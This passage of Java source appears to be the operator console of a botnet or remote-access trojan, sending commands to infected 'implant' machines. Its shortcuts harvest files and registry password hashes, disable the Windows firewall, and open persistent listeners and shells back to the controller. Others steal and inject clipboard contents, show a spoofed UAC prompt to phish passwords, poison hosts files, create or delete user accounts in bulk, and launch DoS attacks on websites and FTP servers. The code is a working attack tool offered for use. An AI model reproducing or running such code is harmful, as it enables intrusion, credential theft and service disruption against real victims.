			 * HARVEST FILES UNDER DIRECTORY (RECURSIVE)
			 * 
			 */
			if(shortcut.equals(this.strHarvestFilesUnderDirectory))
			{
				this.jtfCommand_Broadcast.setText(Driver.EXFIL_DIRECTORY + ", " + "c:\\users\\pwnie\\Desktop, *.*, false");
				return true;
			}
			
			
			
			/**
			 * 
			 * DISABLE WINDOWS FIREWALL
			 * 
			 */
			if(shortcut.equals(this.strDisableWindowsFirewall))
			{
				this.jtfCommand_Broadcast.setText(Driver.DISABLE_WINDOWS_FIREWALL);
				broadcastCommand();
				
			}
			
			/**
			 * 
			 * ENABLE WINDOWS FIREWALL
			 * 
			 */
			if(shortcut.equals(this.strEnableWindowsFirewall))
			{
				this.jtfCommand_Broadcast.setText(Driver.ENABLE_WINDOWS_FIREWALL);
				broadcastCommand();
				
			}
			
			/**
			 * 
			 * DISPLAY WINDOWS FIREWALL
			 * 
			 */
			if(shortcut.equals(this.strDisplayWindowsFirewall))
			{
				this.jtfCommand_Broadcast.setText(Driver.DISPLAY_WINDOWS_FIREWALL);
				broadcastCommand();
				
			}
			
			/**
			 * 
			 * HARVEST HASHES
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_HarvestHash))
			{
				this.jtfCommand_Broadcast.setText(Driver.HARVEST_REGISTRY_HASHES);
				broadcastCommand();
			}
			
			/**
			 * 
			 * ESTABLISH PERSISTENT LISTENER
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_EstablishPersistentListener))
			{
				int portToListenHard = 80;
				try
				{
					portToListenHard = Integer.parseInt(Drivers.jop_Query("Please specify port to establish listener on implant machine", "Enter Listener Port"));
					
					//got here, at least input is an int, ensure it's within range
					if(portToListenHard < 1 || portToListenHard > 65534)
					{
						throw new Exception("port out of range");
					}
					
				}
				catch(Exception e)
				{
					Drivers.jop_Error("Invalid port entered or port is out of range", "Unable to set port");
					return false;
				}
				
				//ELSE, WE HAVE A GOOD PORT, SET THE SHORTCUT KEY				
				if(i_am_broadcast_frame)
				{
					this.jtfCommand_Broadcast.setText(Driver.SHORTCUT_KEY_HEADER + Driver.SHORTCUT_VALUE_ESTABLISH_PERSISTENT_LISTENER + Driver.INTERNAL_DELIMETER +  portToListenHard + Driver.INTERNAL_DELIMETER + Driver.SHORT_KEY_DEFAULT_IMPLANT_NAME);
				}
				else if(i_am_private_frame)
				{
					this.jtfCommand_Private.setText(Driver.SHORTCUT_KEY_HEADER + Driver.SHORTCUT_VALUE_ESTABLISH_PERSISTENT_LISTENER + Driver.INTERNAL_DELIMETER +  portToListenHard + Driver.INTERNAL_DELIMETER + Driver.SHORT_KEY_DEFAULT_IMPLANT_NAME);
				}
			}
			
			/**
			 * 
			 * DOWNLOAD FILE FROM REMOTE SYSTEM
			 * 
			 */
			else if(shortcut.equals(this.strDownloadFileFromSystem))
			{
				this.jtfCommand_Broadcast.setText("download \"[absolute path to file on victim machine (including quotes)]\"");
			}
			
			/**
			 * 
			 * UPLOAD FILE FROM REMOTE SYSTEM
			 * 
			 */
			else if(shortcut.equals(this.strUploadFileFromSystem))
			{
				Drivers.jop_Warning("Feature is coming soon...                  ", "Feature not yet implemented...");
			}
			
			
			/**
			 * 
			 * COPY CLIPBOARD
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_CopyClipboard))
			{
				this.jtfCommand_Broadcast.setText(Driver.EXTRACT_CLIPBOARD);//paste command
				broadcastCommand();//send command
			}
			
			/**
			 * 
			 * INJECT INTO CLIPBOARD
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_InjectIntoClipboard))
			{
				
				this.jtfCommand_Broadcast.setText(Driver.INJECT_CLIPBOARD);//paste commandd
				broadcastCommand();//send command
			}
			
			
			
			/**
			 * 
			 * PLAY SOUND, DISPLAY SPOOFED WINDOWS UAC FRAME TO SOLICIT USER TO ENTER THEIR PASSWORDS
			 * 
			 */
			else if(shortcut.equals(this.strSpoofWindowsUAC))
			{
				this.jtfCommand_Broadcast.setText(Driver.SPOOF_UAC + ", " + "[Spoof Program Title]" + ", [Executable Name]");
			}
			
			/**
			 * 
			 * SET THE WALL PAPER
			 * 
			 */
			else if(shortcut.equals(this.strShortcutSetWallPaper))
			{
				Drivers.jop_Warning("Feature is coming soon...                  ", "Feature not yet implemented...");
				//this.jtfCommand_Broadcast.setText(Driver.SET_WALLPAPER + " [path on victim to image]");
			}
			
			/**
			 * 
			 * BROWSE REMOTE FILE SYSTEM
			 * 
			 */
			else if(shortcut.equals(this.strBrowseFileSystem))
			{
				this.jtfCommand_Broadcast.setText(Driver.FILE_BROWSER_INITIATE);//paste command
				broadcastCommand();//send command
			}
			
			/**
			 * 
			 * STOP ALL RUNNING PROCESSES IMMEDIATELY
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_StopProcessExecutionImmediately))
			{
				this.jtfCommand_Broadcast.setText(Driver.STOP_PROCESS);//paste command
				broadcastCommand();//send command
			}
			
			/**
			 * 
			 * HARVEST FILES BY TYPE FROM REMOTE SYSTEM
			 * 
			 */
			else if(shortcut.equals(this.strHarvestFilesByType))
			{
				Drivers.jop_Warning("Feature is coming soon...                  ", "Feature not yet implemented...");
			}
			
			/**
			 * 
			 * REAL-TIME RUNNING PROCESS LIST
			 * 
			 */
			else if(shortcut.equals(this.strRunningProcessList))
			{
				//insert the command, then broadcast that badboy!!!
				this.jtfCommand_Broadcast.setText(Driver.RUNNING_PROCESS_LIST);
				broadcastCommand();
				
			}
			
			/**
			 * 
			 * DISPLAY DNS ENTRIES
			 * 
			 */
			else if(shortcut.equals(this.strDisplayDNS))
			{
				//insert the command, then broadcast that badboy!!!
				this.jtfCommand_Broadcast.setText("ipconfig /displaydns");
				broadcastCommand();
				
			}
			
			/**
			 * 
			 * ENABLE CLIPBOARD EXTRACTOR
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_EnableClipboardExtraction))
			{
				//insert the command, then broadcast that badboy!!!
				this.jtfCommand_Broadcast.setText(Driver.ENABLE_CLIPBOARD_EXTRACTOR);
				broadcastCommand();				
			}
			
			/**
			 * 
			 * ENABLE CLIPBOARD INJECTOR
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_EnableClipboardInjection))
			{
				//insert the command, then broadcast that badboy!!!
				this.jtfCommand_Broadcast.setText(Driver.ENABLE_CLIPBOARD_INJECTOR);
				broadcastCommand();	
				
				//this.jtfCommand_Broadcast.setText(Driver.ENABLE_CLIPBOARD_INJECTOR + ", <Text to Inject into clipboard> [, Selective Text Replace]");
			}
			
			/**
			 * 
			 * DISABLE CLIPBOARD EXTRACTOR
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_DisableClipboardExtraction))
			{
				//insert the command, then broadcast that badboy!!!
				this.jtfCommand_Broadcast.setText(Driver.DISABLE_CLIPBOARD_EXTRACTOR);
				broadcastCommand();				
			}
			
			/**
			 * 
			 * DISABLE CLIPBOARD INJECTOR
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_DisableClipboardInjection))
			{
				//insert the command, then broadcast that badboy!!!
				this.jtfCommand_Broadcast.setText(Driver.DISABLE_CLIPBOARD_INJECTOR);
				broadcastCommand();				
			}
			
			/**
			 * 
			 * GRAB HOST FILE
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_grab_host_file))
			{
				//insert the command, then broadcast that badboy!!!
				this.jtfCommand_Broadcast.setText(Driver.GRAB_HOST_FILE);
				broadcastCommand();				
			}
			
			/**
			 * 
			 * APPEND TO HOST FILE
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_append_to_host_file))
			{
				//insert the command, then broadcast that badboy!!!
				this.jtfCommand_Broadcast.setText(Driver.APPEND_TO_HOST_FILE + ", " + "<IP ADDRESS>, <URL>");
				//broadcastCommand();				
			}
			
			/**
			 * 
			 * POISON (OVERWRITE) HOST FILE
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_poison_host_file) || shortcut.equals(this.strOverwrite_DNS_Host_File))
			{
				//insert the command, then broadcast that badboy!!!
				
				//GRAB FILE TO TRANSFER
				File fleToTransmit = Drivers.querySelectFile(true, "Please Select Host File from Attacker Computer to Transfer to Victim", JFileChooser.FILES_ONLY, false, false);
				
				if(fleToTransmit == null || !fleToTransmit.exists())
				{
					Driver.jop_Error("No file selected", "Punt!!!");
					return true;
				}										
						
				/*this.jtfCommand_Broadcast.setText(Driver.POISON_HOST_DNS + ", " + fleToTransmit.getCanonicalPath());
				broadcastCommand();		*/
				
				poison_Host_DNS_File(fleToTransmit);
			}
			
			/**
			 * 
			 * DDOS WEBSITE
			 * 
			 */
			else if(shortcut.equals(this.strDOS_Website))
			{
				//insert the command, then broadcast that badboy!!!
				this.jtfCommand_Broadcast.setText(Driver.DOS_WEBSITE + ", " + "<URL/IP ADDRESS>" + ", " + "<PORT>");
				//broadcastCommand();				
			}
			
			/**
			 * 
			 * HALT DDOS WEBSITE
			 * 
			 */
			else if(shortcut.equals(this.strDOS_Website_HALT))
			{
				//insert the command, then broadcast that badboy!!!
				this.jtfCommand_Broadcast.setText(Driver.DOS_WEBSITE_HALT);
				broadcastCommand();				
			}
			
			
			
			/**
			 * 
			 * CREATE MULTIPLE ACCOUNTS FROM FILE
			 * 
			 */
			if(shortcut.equals(this.strShortcut_CreateMassUserAccounts))
			{
				//insert the command, then broadcast that badboy!!!
				
				//GRAB FILE TO TRANSFER
				File fleToTransmit = Drivers.querySelectFile(true, "Please Select User Accounts CSV File from Attacker Computer to Transfer to Victim", JFileChooser.FILES_ONLY, false, false);
				
				if(fleToTransmit == null || !fleToTransmit.exists())
				{
					Driver.jop_Error("No file selected", "Punt!!!");
					return true;
				}										
						
				/*this.jtfCommand_Broadcast.setText(Driver.POISON_HOST_DNS + ", " + fleToTransmit.getCanonicalPath());
				broadcastCommand();		*/
				
				create_or_delete_mass_user_accounts(fleToTransmit, "add");
			}
			
			/**
			 * 
			 * DELETE MULTIPLE ACCOUNTS FROM FILE
			 * 
			 */
			if(shortcut.equals(this.strShortcut_DeleteMassUserAccounts))
			{
				//insert the command, then broadcast that badboy!!!
				
				//GRAB FILE TO TRANSFER
				File fleToTransmit = Drivers.querySelectFile(true, "Please Select User Accounts CSV File from Attacker Computer to Transfer to Victim", JFileChooser.FILES_ONLY, false, false);
				
				if(fleToTransmit == null || !fleToTransmit.exists())
				{
					Driver.jop_Error("No file selected", "Punt!!!");
					return true;
				}										
						
				/*this.jtfCommand_Broadcast.setText(Driver.POISON_HOST_DNS + ", " + fleToTransmit.getCanonicalPath());
				broadcastCommand();		*/
				
				create_or_delete_mass_user_accounts(fleToTransmit, "del");
			}
			
			
			
			/**
			 * 
			 * ESTSBLISH SHELL TO CONTROLLER (CONNECT TO) COMMAND
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_EstablishShellToController))
			{
				//insert the command, then broadcast that badboy!!!
				this.jtfCommand_Broadcast.setText(Driver.CONNECT_TO + " <IP ADDRESS> <PORT> [<Enable beaconing upon disconnection> <Reconnect if disconnected> <beacon interval seconds>] ");
				//broadcastCommand();				
			}
			
			
			/**
			 * 
			 * DDOS FTP Server
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_DOS_FTP_Server))
			{
				//insert the command
				this.jtfCommand_Broadcast.setText(Driver.DOS_FTP_SERVER + ", " + "<FTP Server URL/IP Address>" + ", " + "21, " +  "20, " + "<User Name>, " + "\"<Password>\", " + "<CMD to execute e.g. LIST>, [Cmd_2], [Cmd_3], ..., [Cmd_n...]");
				//broadcastCommand();				
			}
			
			/**
			 * 
			 * HALT DDOS FTP Server
			 * 
			 */
			else if(shortcut.equals(this.strShortcut_HALT_DOS_FTP_Server))
			{
				//insert the command, then broadcast that badboy!!!
				this.jtfCommand_Broadcast.setText(Driver.DOS_FTP_SERVER_HALT);
				broadcastCommand();				
			}
			
			
			
			
			
			
			
			
			
			
			
			
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("insertShortcutCommand", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	
	
	public boolean poison_Host_DNS_File(File fleToTransmit)
	{
		try
		{
			if(fleToTransmit == null || !fleToTransmit.exists() || !fleToTransmit.isFile())
			{
				Drivers.jop_Error("Host File to Transmit does not exist!!!!", "INVALID FILE TO TRANSMIT");
				return true;
			}
			
			//Ensure we have implants to broadcast to
			if(Drivers.alTerminals.size() < 1)
			{
				Drivers.jop_Error("No implants are connected", "Can't Execute Command");
				return true;
			}
			
			//
			//Read host file into linkedlist and prep for transfer
			//
			LinkedList<String> llHostFile = Driver.getFile_LinkedList(fleToTransmit);
			
			//
			//ensure process completed successfully
			//
			if(llHostFile == null || llHostFile.size() < 1)
			{
				Drivers.jop_Error("Empty file selected. Unable to continue!!!!", "INVALID FILE TO TRANSMIT");
				return true;
			}
					
			//
			//Generate unique index
			//
			int index = (int)Math.random() * 1000000;
			
			//
			//Append beginning and ending delimiters to the linkedlist
			//
			//llHostFile.addFirst(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.BEGIN_HOST_FILE_POISON_DATA + Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + index);
			//llHostFile.addLast(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.END_HOST_FILE_POISON_DATA + Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + index);
			
			
			
			//Otherwise get list of agents to receive host file;
			ArrayList<Thread_Terminal> clients = Drivers.getSelectedClients(this);
			
			if(clients == null)
			{
				clients = Drivers.alTerminals;
			}
			
			Thread_Terminal terminal = null;
			
			for(int i = 0; i < clients.size(); i++)
			{
				terminal = clients.get(i);
				
				if(terminal == null)
					continue;
				
				//
				//SEND BEGINNING HEADER
				//
				terminal.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.BEGIN_HOST_FILE_POISON_DATA + Driver.delimeter_1 + index);
								
				//
				//Send host file data
				//
				for(int j = 0; j < llHostFile.size(); j++)
				{
					terminal.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.STORE_HOST_FILE_POISON_DATA + Driver.delimeter_1 + llHostFile.get(j) + Driver.delimeter_1 + index);
				}
				
				//
				//SEND TAIL CLOSING HEADER
				//
				terminal.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.END_HOST_FILE_POISON_DATA + Driver.delimeter_1 + index);
				
				
			}
			
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("poison_Host_DNS_File", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	
	public boolean create_or_delete_mass_user_accounts(File fleToTransmit, String ADD_OR_DELETE)
	{
		try
		{
			if(fleToTransmit == null || !fleToTransmit.exists() || !fleToTransmit.isFile())
			{
				Drivers.jop_Error("User CSV Accounts File to Transmit does not exist!!!!", "INVALID FILE TO TRANSMIT");
				return true;
			}
			
			//Ensure we have implants to broadcast to
			if(Drivers.alTerminals.size() < 1)
			{
				Drivers.jop_Error("No implants are connected", "Can't Execute Command");
				return true;
			}
			
			//
			//Read host file into linkedlist and prep for transfer
			//
			LinkedList<String> llUserAccounts = Driver.getFile_LinkedList(fleToTransmit);
			
			//
			//ensure process completed successfully
			//
			if(llUserAccounts == null || llUserAccounts.size() < 1)
			{
				Drivers.jop_Error("Empty file selected. Unable to continue!!!!", "INVALID FILE TO TRANSMIT");
				return true;
			}
					
			//
			//Generate unique index
			//
			int index = (int)Math.random() * 1000000;
			
						
			//Otherwise get list of agents to receive host file;
			ArrayList<Thread_Terminal> clients = Drivers.getSelectedClients(this);
			
			if(clients == null)
			{
				clients = Drivers.alTerminals;
			}
			
			Thread_Terminal terminal = null;
			
			for(int i = 0; i < clients.size(); i++)
			{
				terminal = clients.get(i);
				
				if(terminal == null)
					continue;
				
				Drivers.jop_Warning("NOTE: This command must be executed on a Windows machine running with administrator priviliges", "Command Will Fail if Not Given ADMIN Rights");
				
				//
				//SEND BEGINNING HEADER
				//
				terminal.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.BEGIN_CREATE_MASS_USER_ACCOUNTS_DATA + Driver.delimeter_1 + index);
								
				//
				//Send USER ACCOUNT data
				//
				String [] acctAndPass = null;
				String line = "";
				String userName = "";
				String password = "";
				for(int j = 0; j < llUserAccounts.size(); j++)
				{
					try
					{
						line = llUserAccounts.get(j);
						
						if(line == null || line.trim().equals(""))
						{
							continue;
						}
						
						acctAndPass = line.trim().split(",");
						
						userName = acctAndPass[0].trim();
						
						//incase no password is specified
						try
						{
							password = acctAndPass[1].trim();
						}
						catch(Exception ee)
						{
							password = " ";
						}
						
					}
					catch(Exception e)
					{
						Driver.sop("Invalid user account line: \"" + line + "\" <-- Skipping this entry");
						continue;
					}
					
					terminal.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.STORE_MASS_USER_ACCOUNTS_DATA + Driver.delimeter_1 + ADD_OR_DELETE + Driver.delimeter_1 + userName + " " + Driver.delimeter_1 + password + " " + Driver.delimeter_1 + index);
				}
				
				//
				//SEND TAIL CLOSING HEADER
				//
				terminal.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.END_CREATE_MASS_USER_ACCOUNTS_DATA + Driver.delimeter_1 + index);
								
			}
			
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("create_mass_user_accounts", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	
	public boolean sendPrivateMessage(Thread_Terminal terminal)
	{
		try
		{
			//String msgToSend = jtfCommand_Private.getText();
			
			if(terminal == null)
			{
				return false;
			}
			
			
			try
			{
				/**************************************************
				 * 
				 * 
				 * TRAP INSTRUCTIONS
				 * "clear", "cls", "clr"
				 * exit
				 * 
				 * 
				 ****************************************************/
				
				/**************************************************************
				 * 
				 *  TRAP THE "CLEAR" COMMAND AND HANDLE HERE!
				 * 
				 **************************************************************/
				
				//check if user just wants to clear the screen. we'll do so without asking confirmation			 
				terminalText = this.jtfTerminalCommand.getText();
				if(terminalText != null && (terminalText.trim().equalsIgnoreCase("clear") || terminalText.trim().equalsIgnoreCase("clr") || terminalText.trim().equalsIgnoreCase("cls")))
				{
					txtpne_broadcastMessages.clearTextPane();
					jtfTerminalCommand.setText("");
					return true;
				}
				
				//we have the text, clear the textfield
				
				/**************************************************************
				 * 
				 *  TRAP THE EXIT COMMAND TO CLOSE TERMINAL
				 * 
				 **************************************************************/
				 if(this.i_am_private_frame && terminalText!= null &&  terminalText.trim().equalsIgnoreCase("exit") && this.myPrivateFrame != null )
					{
						//close this frame!
						try{myPrivateFrame.closeFrame();return true;} catch(Exception e){}						
					}
				
				
				////Determine if we post response in main broadcast frame or if we are to post into private messages
				if(terminal.alJtxtpne_PrivatePanes != null && terminal.alJtxtpne_PrivatePanes.size() > 0)
				{
					for(int i = 0; i < terminal.alJtxtpne_PrivatePanes.size(); i++)
					{
						//terminal.alJtxtpne_PrivatePanes.get(i).appendString(true, "_"+terminal.getThreadID(), terminalText, Drivers.clrController, Drivers.clrBackground);
						
						terminal.alJtxtpne_PrivatePanes.get(i).appendString(true, "ME", terminalText, Drivers.clrController, Drivers.clrBackground);//2013-02-25 solo edit
					}

				}
				else//post to the main chat window.  No private messages were established
				{
					//Drivers.txtpne_broadcastMessageBoard.appendString(true, "_"+terminal.getThreadID(), terminalText, Drivers.clrController, Drivers.clrBackground);
					Drivers.txtpne_broadcastMessageBoard.appendString(true, "ME", terminalText, Drivers.clrController, Drivers.clrBackground);//2013-02-25 solo edit
				}
							
				
			}
			catch(Exception e)
			{				
				txtpne_broadcastMessages.appendString(true, "ME", terminalText, Drivers.clrController, Drivers.clrBackground);
				
			}
			
			saveCommandHistory(terminalText);
			
			//else, send the message!
			terminal.sendCommand_RAW(terminalText);
			
			//CLEAR THE JTF
			//this.jtfCommand_Private.setText("");
			jtfTerminalCommand.setText("");
			
			return true;
		}
		catch(NullPointerException e)
		{
			Drivers.sop("Null Pointer Exception caught when attempting to send a private chat message");
		}
		catch(Exception e)
		{
			Drivers.eop("sendPrivateMessage", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean establishPrivateTerminal()
	{
		try
		{
			//Ensure we have implants to establish a private session with
			if(Drivers.alTerminals.size() < 1)
			{
				Drivers.jop_Error("No implants are connected", "Cannot Establish Private Terminal");
				return false;
			}
			
			/***********************************************************
			 * 
			 * SINGLE SELECTION
			 * 
			 **********************************************************/
			
			//handle accordingly based if we 're allowing multiple or single selection
			if(jlstConnectedClients.getSelectionMode() == ListSelectionModel.SINGLE_SELECTION)
			{
				//ensure user selected an agent
				int index = this.jlstConnectedClients.getSelectedIndex();
				
				if(index < 0)
				{
					Drivers.jop_Error("Please select an implant to continue.", "Cannot Establish Private Terminal");
					return false;
				}
												
				//otherwise determine if we are establishing a private frame or a private tab
				if(this.jrbPrivateFrame.isSelected())
				{
					Frame_PrivateTerminal privateFrame = new Frame_PrivateTerminal(this.INDEX_THIS_IS_PRIVATE_TERMINAL_FRAME, Drivers.alTerminals.get(index));
					privateFrame.setVisible(true);
					
				}
				else if(this.jrbPrivateTab.isSelected())
				{
					Drivers.jop_Message("Solo, need to continue in " + this.strMyClassName + " to add logic for creating private tabs");
				}	
				
			}
			
			/***********************************************************
			 * 
			 * MULTIPLE SELECTION
			 * 
			 **********************************************************/
			
			else //MULTIPLE SELECTION IS ENABLED
			{
				//get list of selected agents to message
				selectedImplantIndecies = this.jlstConnectedClients.getSelectedIndices();
	
				if(selectedImplantIndecies == null || selectedImplantIndecies.length < 1)
				{
					Drivers.jop_Error("No implants are selected", "Cannot Establish Private Terminal");
					return false;
				}
				
				//open a private terminal for each client selected
				for(int i = 0; i < selectedImplantIndecies.length; i++)
				{
					//determine if we are establishing a private frame or a private tab
					if(this.jrbPrivateFrame.isSelected())
					{
						Frame_PrivateTerminal privateFrame = new Frame_PrivateTerminal(this.INDEX_THIS_IS_PRIVATE_TERMINAL_FRAME, Drivers.alTerminals.get(i));
						privateFrame.setVisible(true);
					}
					else if(this.jrbPrivateTab.isSelected())
					{
						Drivers.jop_Message("Solo, need to continue in " + this.strMyClassName + " to add logic for creating private tabs");
					}					
					
				}//END FOR
			
			}//END ELSE
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("establishPrivateTerminal", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean broadcastCommand()
	{
		try
		{
			
			/**************************************************
			 * 
			 * 
			 * TRAP INSTRUCTIONS
			 * "clear", "cls", "clr"
			 * exit
			 * 
			 * 
			 ****************************************************/
			
			/********************************************************************
			 * TRAP FOR THE CLEAR COMMAND SENT BY THE USER (BOTNET MASTER)
			 ********************************************************************/
			
			//check if user just wants to clear the screen. we'll do so without asking confirmation			 
			terminalText = this.jtfCommand_Broadcast.getText();
			if(terminalText != null && (terminalText.trim().equalsIgnoreCase("clear") || terminalText.trim().equalsIgnoreCase("clr") || terminalText.trim().equalsIgnoreCase("cls")))
			{
				txtpne_broadcastMessages.clearTextPane();
				jtfCommand_Broadcast.setText("");
				return true;
			}
			
			
			//Ensure we have implants to broadcast to
			if(Drivers.alTerminals.size() < 1)
			{
				Drivers.jop_Error("No implants are connected", "Can't Send Command");
				return false;
			}
			
			//get list of selected agents to message
			selectedImplantIndecies = this.jlstConnectedClients.getSelectedIndices();
			
			messageTransmittedOK = true;//assume a good send
						
			
			//check if we are broadcasting to everyone... if so, then the index should be null
			if(selectedImplantIndecies == null || selectedImplantIndecies.length < 1)
			{
				for(int i = 0; i < Drivers.alTerminals.size(); i++)
				{
					// we assume data overhead is complete by now
					
					//check if we're sending a chat message, if so, only send to controllers and relays
					/*********************************************************************************************************************
					 * BROADCAST CHAT MESSAGE
					 *********************************************************************************************************************/
					if(this.i_am_public_chat_frame && (Drivers.alTerminals.get(i).i_am_Controller_Agent || Drivers.alTerminals.get(i).i_am_Relay_Agent))
					{
						messageTransmittedOK &= Drivers.alTerminals.get(i).sendCommand_RAW(Driver.CHAT_MESSAGE_BROADCAST + Driver.delimeter_1 + Driver.FLAG_BROADCAST +  Driver.delimeter_1 + this.jtfCommand_Broadcast.getText() +  Driver.delimeter_1 + " " + this.jtfMyScreenName.getText().trim());
					}
					
					/*********************************************************************************************************************
					 * NORMAL BROADCAST COMMAND
					 *********************************************************************************************************************/
					else//send out as normal
					{
						messageTransmittedOK &= Drivers.alTerminals.get(i).sendCommand_RAW(this.jtfCommand_Broadcast.getText());
					}
					
					
				}
				
				if(messageTransmittedOK) //only display if there were no errors reported with sending the command
				{
					txtpne_broadcastMessages.appendString(true, false, "ME", "> ALL", this.jtfCommand_Broadcast.getText(), Drivers.clrBackground, Drivers.clrController, Drivers.clrImplant);
					
					//saveCommandHistory(this.jtfCommand_Broadcast.getText());
					
				}
				
				//just finished sending command, clear the textfield
				jtfCommand_Broadcast.setText("");
			}
			
			//otherwise, only send to the selected recipients
			for(int j = 0; j < selectedImplantIndecies.length; j++)
			{
				//we assume data scquisition is complete by now
				//check if we're sending a chat message, if so, only send to controllers and relays
				/*********************************************************************************************************************
				 * PRIVATE CHAT MESSAGE
				 *********************************************************************************************************************/
				if(this.i_am_public_chat_frame && (Drivers.alTerminals.get(selectedImplantIndecies[j]).i_am_Controller_Agent || Drivers.alTerminals.get(selectedImplantIndecies[j]).i_am_Relay_Agent))
				{
					messageTransmittedOK &= Drivers.alTerminals.get(selectedImplantIndecies[j]).sendCommand_RAW(Driver.CHAT_MESSAGE_BROADCAST + Driver.delimeter_1 + Driver.FLAG_PRIVATE +  Driver.delimeter_1 + this.jtfCommand_Broadcast.getText() +  Driver.delimeter_1 + " " + this.jtfMyScreenName.getText().trim());
				}
				/*********************************************************************************************************************
				 * NORMAL PRIVATE COMMAND
				 *********************************************************************************************************************/
				else//send out as normal
				{
					messageTransmittedOK &= Drivers.alTerminals.get(selectedImplantIndecies[j]).sendCommand_RAW(this.jtfCommand_Broadcast.getText());
				}
				
				if(messageTransmittedOK) //only display if there were no errors reported with sending the command
					txtpne_broadcastMessages.appendString(true, false, "ME", Drivers.alTerminals.get(selectedImplantIndecies[j]).getJListData(), this.jtfCommand_Broadcast.getText(), Drivers.clrBackground, Drivers.clrController, Drivers.clrImplant);
			}
			
			//just finished sending command, clear the textfield
			jtfCommand_Broadcast.setText("");
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("broadcastCommand", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean saveCommandHistory(String history)
	{
		//SAVE THE COMMAND IN THE HISTORY!!!
		try
		{			
			if(history == null || alMyCommandHistory.contains(history.trim()))
			{
				return true;//don't add an already stored command
			}
			
			//check if we do an add to the history, or a set to the history
			if(this.alMyCommandHistory.size() < MAX_COMMAND_HISTORY)
			{
				//add the command!!!
				
				//only store first 20 bits of whatever the user types
				if(history!= null && history.length() > HISTORY_MAX_BYTES_TO_STORE)
				{
					this.alMyCommandHistory.add(history.substring(0, HISTORY_MAX_BYTES_TO_STORE-1));
				}
				else
				{
					this.alMyCommandHistory.add(history);
				}
				
				//ensure we do not go over the max range
				nextAvailSlotInHistory = this.alMyCommandHistory.size() % MAX_COMMAND_HISTORY;
				
				//update current pointer for the user
				//currentCommandHistoryIndex = Math.abs(this.alMyCommandHistory.size()) % MAX_COMMAND_HISTORY;
				currentCommandHistoryIndex = this.alMyCommandHistory.size();
			}
			
			else//we have reached the limit to place in the history, overwrite one of the elements
			{
				//only store first 20 bits of whatever the user types
				if(history!= null && history.length() > HISTORY_MAX_BYTES_TO_STORE)
				{
					this.alMyCommandHistory.set(nextAvailSlotInHistory, history.substring(0, HISTORY_MAX_BYTES_TO_STORE-1));
				}
				else
				{
					this.alMyCommandHistory.set(nextAvailSlotInHistory, history);
				}
				
				//update my counter!
				nextAvailSlotInHistory =  (++nextAvailSlotInHistory) % MAX_COMMAND_HISTORY;//ensure we do not go over the max range
				
				//update current pointer for the user
				//currentCommandHistoryIndex = Math.abs(this.alMyCommandHistory.size()) % MAX_COMMAND_HISTORY;
				currentCommandHistoryIndex = nextAvailSlotInHistory;
			}
			
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("saveCommandHistory", this.strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
		
	}

	@Override
	public void keyTyped(KeyEvent ke) 
	{
		try
		{
			
			
		}
		catch(Exception e)
		{
			Drivers.eop("KeyTyped", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
	}
	
	@Override
	public void keyPressed(KeyEvent ke) 
	{
		try
		{
			
			
		}
		catch(Exception e)
		{
			Drivers.eop("keyPressed", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
	}
	

	@Override
	public void keyReleased(KeyEvent ke) 
	{
		try
		{
			if(ke.getKeyCode() == KeyEvent.VK_UP)
			{
				//do the same action if it is one of our jtext fields
				if(ke.getSource() == this.jtfCommand_Broadcast || ke.getSource() == this.jtfCommand_Private || ke.getSource() == this.jtfTerminalCommand)
				{
					moveCommandUp();
				}
				
				
			}
			
			else if(ke.getKeyCode() == KeyEvent.VK_DOWN)
			{
				//do the same action if it is one of our jtext fields
				if(ke.getSource() == this.jtfCommand_Broadcast || ke.getSource() == this.jtfCommand_Private || ke.getSource() == this.jtfTerminalCommand)
				{
					moveCommandDown();
				}
			}
			
		}
		catch(Exception e)
		{
			Drivers.eop("keyReleased", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
	}
	
	public boolean moveCommandUp()
	{
		try
		{
			boolean reset = false;
			
